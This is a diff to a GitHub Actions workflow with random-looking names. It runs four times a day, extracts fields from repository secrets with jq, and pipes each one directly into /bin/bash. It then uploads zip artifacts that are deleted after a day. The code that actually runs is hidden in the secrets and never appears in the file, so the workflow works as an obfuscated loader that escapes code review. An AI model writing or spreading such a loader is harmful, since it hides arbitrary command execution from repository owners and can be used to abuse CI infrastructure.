@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '55 1,7,13,19 * * *'
+    - cron: '44 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -17,18 +17,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          pyhqu10: ${{ secrets.pyhqu10 }}
+          lni85888: ${{ secrets.lni85888 }}
         run: |
-          printf '%s' "$pyhqu10" | jq -r .b078 | /bin/bash
-          echo $ulc62219 | jq -r .xhkx141 | /bin/bash
-          printf '%s' "$m62084" | jq -r .yan559 | /bin/bash
-          echo $wmbkv36 | jq -r .zbti934 | /bin/bash
-          printf '%s' "$ed3" | jq -r .lfqv9 | /bin/bash
-          printf '%s' "$yl53312" | jq -r .cyu769 | /bin/bash
+          printf '%s' "$lni85888" | jq -r .lfne7 | /bin/bash
+          printf '%s' "$sgss3" | jq -r .wc64935 | /bin/bash
+          echo $zdgg874 | jq -r .v5 | /bin/bash
+          printf '%s' "$uitt1" | jq -r .du554 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
         with:
-          name: r26rSvwc
+          name: shDSw1p7
           path: "*.zip"
           retention-days: 1
